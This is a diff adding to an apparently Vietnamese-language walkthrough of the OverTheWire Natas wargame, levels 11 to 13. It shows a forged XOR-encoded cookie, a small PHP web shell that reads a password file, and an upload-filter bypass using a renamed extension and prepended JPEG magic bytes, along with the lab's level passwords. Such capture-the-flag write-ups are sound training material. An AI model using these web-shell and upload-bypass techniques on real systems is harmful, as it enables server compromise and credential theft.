@@ -53,7 +53,22 @@ Query: `'' -m10  /etc/natas_webpass/natas11`
 https://gchq.github.io/CyberChef/#recipe=XOR(%7B'option':'Base64','string':'ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%253D'%7D,'Standard',false)&input=eyJzaG93cGFzc3dvcmQiOiJubyIsImJnY29sb3IiOiIjZmZmZmZmIn0  
 Xor key: qw8J
 Crafted cookie: data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK  
-**user: natas12**
+**user: natas12**  
 **pass: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3**
 ## Natas12
+Tạo file php có nội dụng
+```php
+<?php 
+    echo exec("cat /etc/natas_webpass/natas13");
+?>
+```
+Upload file, sau đó dùng burp suite để sửa file extension thành ${random}.php (file đính kèm trong /natas12/exploit.php)
+**user: natas13**
+**pass: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY**
+## Natas13
+Thêm 4 bytes `FF D8 FF DB` vào trước file được tạo ở natas12
+Upload file, sau đó dùng burp suite để sửa file extension thành ${random}.php (file đính kèm trong /natas13/exploit.php)
+
+
+
 
